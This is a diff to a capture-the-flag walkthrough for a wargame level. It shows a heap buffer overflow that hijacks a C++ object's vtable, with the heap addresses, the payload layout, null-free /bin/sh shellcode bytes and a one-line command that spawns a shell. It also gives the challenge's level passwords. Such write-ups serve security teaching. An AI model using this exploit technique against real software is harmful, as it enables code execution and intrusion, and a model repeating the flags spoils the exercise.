@@ -3,12 +3,11 @@
    Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
 2. Analyze the binary with Ghidra:
-   - C++ program with class N (108 bytes)
-   - Class N has vtable pointer at offset 0, annotation buffer at offset 4, int at offset 0x68
+   - C++ program with class N (108 bytes: vtable pointer, annotation[100], int)
    - N::setAnnotation(char*) - uses strlen() then memcpy() with no bounds check
-   - Vtable at 0x08048848 contains: operator+ (0x0804873a), operator- (0x0804874e)
-   - Main allocates two N objects and calls setAnnotation(argv[1]) on first object
-   - Then calls virtual function through second object's vtable
+   - Main allocates two N objects on heap, calls setAnnotation(argv[1]) on obj1
+   - Virtual function call through obj2's vtable can be hijacked
+   - Original vtable at 0x08048848
 
 3. Connect to the VM via SSH:
    ssh level9@localhost -p 2222
@@ -18,56 +17,36 @@
    ltrace ./level9 AAAA
    
    Output shows:
-   _Znwj(108, ...)  = 0x804a008  ← obj1 allocated
-   _Znwj(108, ...)  = 0x804a078  ← obj2 allocated
+   _Znwj(108) = 0x804a008  ← obj1
+   _Znwj(108) = 0x804a078  ← obj2
    
-   Distance: 0x804a078 - 0x804a008 = 0x70 = 112 bytes
+   obj1 annotation buffer: 0x804a00c (obj1 + 4)
+   obj2 vtable pointer:    0x804a078
+   obj2 annotation buffer: 0x804a07c (obj2 + 4)
    
-   obj1 annotation buffer starts at: 0x804a00c (obj1 + 4)
-   obj2 vtable pointer at: 0x804a078
+   Distance: 0x804a078 - 0x804a00c = 108 bytes
 
 5. Calculate the exploit:
-   Goal: Overflow obj1's annotation buffer to overwrite obj2's vtable pointer
+   Goal: Overflow obj1's annotation to overwrite obj2's vtable pointer
    
-   Distance from annotation buffer to obj2 vtable:
-   0x804a078 - 0x804a00c = 0x6c = 108 bytes
+   Constraint: strlen() stops at null bytes, need null-free addresses
    
-    Challenge: strlen() stops at null bytes, so we need:
-    - Null-byte-free shellcode
-    - Addresses without null bytes
-    
-    Solution:
-    - Use null-free shellcode from level2 (24 bytes, Exploit-DB #42428)
-      \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
-      \x50\x53\x89\xe1\xb0\x0b\xcd\x80
-      
-      See level2 documentation for detailed shellcode analysis.
-   
-   - Place shellcode at START of annotation buffer
-   - Fill rest with NOPs to reach obj2's vtable
-   - Overflow to overwrite obj2's vtable with fake vtable address
-   - Fake vtable points back to our shellcode location
+   Strategy:
+   - Place shellcode at obj1 annotation (0x804a00c)
+   - Overwrite obj2 vtable pointer to 0x804a07c (obj2's annotation buffer)
+   - Write shellcode address (0x804a00c) to 0x804a07c (fake vtable entry)
+   - Virtual call: obj2 → fake vtable → shellcode
    
    Payload structure:
-   [24-byte shellcode] + [84 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
-   
-   - Bytes 0-23: Shellcode (24 bytes)
-   - Bytes 24-107: Padding (\x90 * 84) - fills space to reach offset 108
+   - Bytes 0-23:    Shellcode (24 bytes, null-free from level2)
+   - Bytes 24-107:  Padding (84 bytes)
    - Bytes 108-111: Fake vtable pointer = 0x0804a07c (\x7c\xa0\x04\x08)
    - Bytes 112-115: Shellcode address = 0x0804a00c (\x0c\xa0\x04\x08)
-   
-   The fake vtable at 0x0804a07c contains the address 0x0804a00c,
-   which points to the start of our payload where shellcode is located.
 
 6. Execute the exploit:
    ./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
-   
-   Shell spawned!
 
-7. Get the flag:
-   cat /home/user/bonus0/.pass
-   
-   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+7. Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 8. Exit and login as bonus0:
    su bonus0
